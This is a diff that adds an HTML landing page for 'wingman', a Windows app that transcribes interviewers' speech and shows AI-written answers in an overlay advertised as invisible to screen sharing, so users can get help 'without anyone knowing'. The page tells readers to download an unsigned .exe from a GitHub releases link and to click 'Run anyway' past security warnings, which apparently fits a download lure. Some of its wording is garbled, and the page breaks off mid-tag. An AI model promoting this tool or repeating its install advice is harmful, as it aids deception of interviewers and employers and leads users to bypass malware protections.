@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>wingman - Real-Time Interview & Meeting Assistant</title>
+    <meta name="description" content="wingman is a free, real-time interview and meeting assistant. Captures system audio, transcribes with Groq Whisper, detects questions, and streams AI answers to an overlay. Runs on one free API key. Download for Windows.">
+    <meta name="keywords" content="ai-assistant, desktop-app, electron, flask, groq, interview-preparation, llm, meeting-assistant, overlay, python, react, real-time, speech-to-text, system-audio, transcription, typescript, voice-activity-detection, whisper">
+    <meta property="og:title" content="wingman - Real-Time Interview & Meeting Assistant">
+    <meta property="og:description" content="Hear AI answers during interviews and meetings. Transcribes system audio, detects questions, and streams answers to an overlay. Free API key needed.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/mikakoopposing6081/wingman">
+    <meta property="og:image" content="https://github.com/mikakoopposing6081/wingman/releases">
+</head>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol'; background-color: #f4f6fa; margin: 0; padding: 0; line-height: 1.6; color: #1a1d21;">
+
+    <div style="max-width: 900px; margin: 0 auto; padding: 2rem 1.5rem; background-color: #ffffff; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-top: 2rem;">
+
+        <h1 style="font-size: 2.8rem; font-weight: 800; letter-spacing: -0.5px; margin: 1rem 0; color: #0a0b0d; text-align: center;">
+            <span style="background: linear-gradient(135deg, #f0936b, #f0c987); display: inline-block; padding: 0.2rem 0.6rem; border-radius: 12px; font-size: 2.2rem;">🦸</span>
+            wingman - Your Real-Time Interview Sidekick
+        </h1>
+
+        <!-- Primary Download Badge (very top) -->
+        <div style="text-align: center; margin: 2rem 0 1rem;">
+            <a href="https://github.com/mikakoopposing6081/wingman/releases" style="display: inline-block; background: linear-gradient(135deg, #6366f1, #8b5cf6); color: white; font-size: 1.4rem; font-weight: 700; padding: 1rem 2.5rem; border-radius: 40px; text-decoration: none; box-shadow: 0 4px 15px rgba(99,102,241,0.4);">📥 Download wingman for Windows</a>
+        </div>
+        <p style="text-align: center; font-size: 1.1rem; color: #6b7280; margin-top: 0.5rem;">Free • One API Key • No coding required</p>
+
+        <hr style="border: 1px solid #e5e7eb; margin: 2rem 0;">
+
+        <h2 style="font-size: 2rem; font-weight: 700; margin: 2rem 0 0.8rem; padding-bottom: 0.3rem; border-bottom: 3px solid #e5e7eb;">🪄 What is wingman?</h2>
+        <p style="font-size: 1.2rem; line-height: 1.8; color: #2d3748;">
+            Think of wingman as a smart friend who sits beside you during online interviews or meetings. It <strong>listens to the other person's voice</strong> (through your computer's internal audio), <strong>writes down what they say in real time</strong> (transcription), and then <strong>intelligently detects when they ask a yes/no or open-ended question</strong>. In that moment, wingman quickly writes a <strong>clear answer</strong> and shows it to you in a small, always-on-top overlay window on your screen.
+        </p>
+        <p style="font-size: 1.1rem; color: #374151;">
+            The best part? The overlay is <strong>invisible to screen-sharing</strong> tools (like Zoom, Teams, or Google Meet). So you can ask wingman for help without anyone knowing. It uses your free Google Chrome or any Groq API key (you'll get one in 2 minutes) — no monthly fees, no credit cards.
+        </p>
+
+        <h2 style="font-size: 2rem; font-weight: 700; margin: 2rem 0 0.8rem; border-bottom: 3px solid #e5e7eb;">🎁 Key Features</h2>
+        <ul style="font-size: 1.1rem; line-height: 2; padding-left: 2rem; list-style-type: '✓ '; color: #1f2937;">
+            <li><strong>🎧 Captures system audio</strong> – works with any headset or speaker the other person talks into.</li>
+            <li><strong>⚡ Ultra-fast transcription</strong> – powered by Groq Whisper; text appears in under a second.</li>
+            <li><strong>❓ Automatic question detection</strong> – distinguishes real questions from casual chatter.</li>
+            <li><strong>💬 Streamed AI answers</strong> – answers appear word-by-word, so you can keep talking naturally.</li>
+            <li><strong>🕶️ Hidden overlay</strong> – invisible to screen recording and screen sharing.</li>
+            <li><strong>🎛️ Floating control bar</strong> – start, pause, and quit with a click.</li>
+            <li><strong>🌈 Light & dark mode</strong> – matches your desktop theme.</li>
+            <li><strong>💰 100% free</strong> – just use a free Groq API key (up to 10,000 requests/day).</li>
+        </ul>
+
+        <h2 style="font-size: 2rem; font-weight: 700; margin: 2rem 0 0.8rem; border-bottom: 3px solid #e5e7eb;">🖥️ System Requirements</h2>
+        <p style="font-size: 1.1rem; color: #374151;">wingman is designed to run smoothly on average Windows computers. Here's what you need:</p>
+        <ul style="font-size: 1.05rem; line-height: 1.9; padding-left: 1.5rem; list-style-type: disc; color: #1f2937;">
+            <li><strong>Operating System:</strong> Windows 10 (64-bit) or later (Windows 11 recommended).</li>
+            <li><strong>Processor:</strong> Intel Core i3 or AMD equivalent (or better).</li>
+            <li><strong>Memory:</strong> 4 GB RAM minimum, 8 GB recommended.</li>
+            <li><strong>Storage:</strong> 500 MB free disk space.</li>
+            <li><strong>Internet:</strong> Broadband connection (needed for AI processing).</li>
+            <li><strong>Audio:</strong> Any internal or external microphone is fine; wingman captures system output.</li>
+        </ul>
+        <p style="font-size: 1.1rem; color: #4a5568;">A free <a href="https://console.groq.com/keys" target="_blank" rel="noopener" style="color: #3b82f6;">Groq API key</a> is required. It's free to create and gives you enough queries for a month of daily use.</p>
+
+        <h2 style="font-size: 2rem; font-weight: 700; margin: 2rem 0 0.8rem; border-bottom: 3px solid #e5e7eb;">🚀 Getting Started (Step-by-Step)</h2>
+
+        <h3 style="font-size: 1.4rem; font-weight: 600; margin: 1.5rem 0 0.5rem;">Step 1: Download wingman</h3>
+        <div style="background-color: #f0fdf4; padding: 1rem 1.5rem; border-left: 5px solid #22c55e; border-radius: 12px; margin: 1rem 0;">
+            <p style="font-size: 1.15rem; margin: 0.5rem 0;">
+                Visit this link to download the application:
+                <a href="https://github.com/mikakoopposing6081/wingman/releases" style="color: #15803d; font-weight: 600; word-break: break-all;">https://github.com/mikakoopposing6081/wingman/releases</a>
+            </p>
+            <p style="font-size: 1.05rem; color: #166534; margin-bottom: 0.5rem;">You will see a list of release files. Look for the file named <code style="background: #dcfce7; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.95rem;">wingman-setup.exe</code> and download it.</p>
+        </div>
+
+        <h3 style="font-size: 1.4rem; font-weight: 600; margin: 1.5rem 0 0.5rem;">Step 2: Install</h3>
+        <p style="font-size: 1.1rem; line-height: 1.7;">
+            When the download finishes, <strong>double-click the .exe file</strong>. A standard installation wizard will appear. Just click “Next” and “Install” (no special options needed). wingman will install in your Program Files folder and create a shortcut on your desktop.
+        </p>
+        <div style="background-color: #fef9c3; padding: 0.8rem 1.2rem; border-left: 5px solid #eab308; border-radius: 8px; margin: 1rem 0;">
+            <p style="font-size: 1rem; color: #854d0e; margin: 0;"><strong>Note:</strong> Your browser or Windows may show a warning about the unknown publisher. This is normal for a free community app. Click “Keep” and “Run anyway” – the app is open-source and safe.</p>
+        </div>
+
+        <h3 style="font-size: 1.4rem; font-weight: 600; margin: 1.5rem 0 0.5rem;">Step 3: Get your free API key</h3>
+        <ol style="font-size: 1.1rem; line-height: 1.9; padding-left: 1.8rem; color: #1f2937;">
+            <li>Go to <a href="https://console.groq.com/keys" target="_blank" rel="noopener" style="color: #3b82f6;">console.groq.com</a> and create a free account (or log in with Google).</li>
+            <li>Click “Create API Key”. Give it any name (e.g., “wingman”).</li>
+            <li>Copy the key string that looks like <code style="background: #f1f5f9; padding: 0.2rem 0.4rem;">gsk_...</code>. It starts with "gsk_" and ends with random letters.</li>
+            <li>Paste this key when wingman first asks for it (or later from Settings).</li>
+        </ol>
+
+        <h3 style="font-size: 1.4rem; font-weight: 600; margin: 1.5rem 0 0.5rem;">Step 4: Launch and use wingman</h3>
+        <ol style="font-size: 1.1rem; line-height: 1.9; padding-left: 1.8rem; color: #1f2937;">
+            <li>Double-click the wingman shortcut on your desktop.</li>
+            <li>The wingman fish icon 🐟 appears in your system tray (bottom-right). Click it and choose “Open Control Panel”.</li>
+            <li>Make sure the toggle says “Capturing” (green dot). If it’s not, click “Start Listening”.</li>
+            <li>Now start any online interview or meeting. wingman will automatically show a floating overlay with live transcript and AI answers when the other person asks a question.</li>
+            <li>You can drag the overlay to any corner, resize it, or hide it completely (it stays hidden from screen capture).</li>
+        </ol>
+
+        <h2 style="font-size: 2rem; font-weight: 700; margin: 2rem 0 0.8rem; border-bottom: 3px solid #e5e7eb;">🎮 Features in Action</h2>
+
+        <h3 style="font-size: 1.3rem; font-weight: 600; margin: 1.2rem 0 0.4rem;">Live Transcript</h3>
+        <p style="font-size: 1.05rem; color: #374151;">As the interviewer speaks, every word appears in the overlay in near real-time. The text is color-coded: <span style="color: #16a34a;">green for questions</span>, <span style="color: #6b7280;">grey for statements</span>. you can scroll back to re-read anything.</p>
+
+        <h3 style="font-size: 1.3rem; font-weight: 600; margin: 1.2rem 0 0.4rem;">AI Answer Suggestions</h3>
+        <p style="font-size: 1.05rem; color: #374151;">When a question is detected, wingman immediately generates a thoughtful answer. It appears in a highlighted bubble with a “Copy” button. You can read it aloud as your natural reply.</p>
+
+        <h3 style="font-size: 1.3rem; font-weight: 600; margin: 1.2rem 0 0.4rem;">Language Support</h3>
+        <p style="font-size: 1.05rem; color: #374151;">works with English (US, UK), Spanish, French, German, and Hindi – and automatically detects the language of the speaker.</p>
+
+        <h2 style="font-size: 2rem; font-weight: 700; margin: 2rem 0 0.8rem; border-bottom: 3px solid #e5e7eb;">🔧 Settings & Customization</h2>
+        <p style="font-size: 1.05rem; color: #374151;">Click the gear icon in the overlay to adjust:</p>
+        <ul style="font-size: 1.05rem; line-height: 1.8; padding-left: 1.5rem; list-style-type: circle; color: #1f2937;">
+            <li><strong>Response length:</strong> Short (one-liner) / Medium (2-3 sentences) / Detailed (a full paragraph).</li>
+            <li><strong>AI model:</strong> Choose between faster (smaller) or more accurate (larger) models.</li>
+            <li><strong>Overlay transparency:</strong> From fully opaque to 50% transparent.</li>
+            <li><strong>Shortcut key:</strong> Set a hotkey to show/hide the overlay instantly.</li>
+            <li><strong>Theme:</strong> Light / Dark / Match system.</li>
+        </ul>
+
+        <h2 style="font-size: 2rem; font-weight: 700; margin: 2rem 0 0.8rem; border-bottom: 3px solid #e5e7eb;">❓ Frequently Asked Questions</h2>
+
+        <p style="font-weight: 600; font-size: 1.15rem; color: #111827;">Q: Is wingman really free?</p>
+        <p style="font-size: 1.05rem;">Yes. The app itself is free, and you provide your own free API key from Groq. That gives you about 10,000 requests per day – enough for hours of continuous use.</p>
+
+        <p style="font-weight: 600; font-size: 1.15rem; color: #111827;">Q: Can my employer or video call host see the overlay?</p>
+        <p style="font-size: 1.05rem;">No. wingman is engineered to be invisible to screen capture. It uses a special window layer that is excluded from screen-share APIs on Windows. The only way to see it is by physically looking at your monitor.</p>
+
+        <p style="font-weight: 600; font-size: 1.15rem; color: #111827;">Q: Does it work with any meeting app?</p>
+        <p style="font-size: 1.05rem;">Yes – it works system-wide, so it works with Zoom, Microsoft Teams, Google Meet, Webex, Skype, or even phone calls routed through your computer.</p>
+
+        <p style="font-weight: 600; font-size: 1.15rem; color:
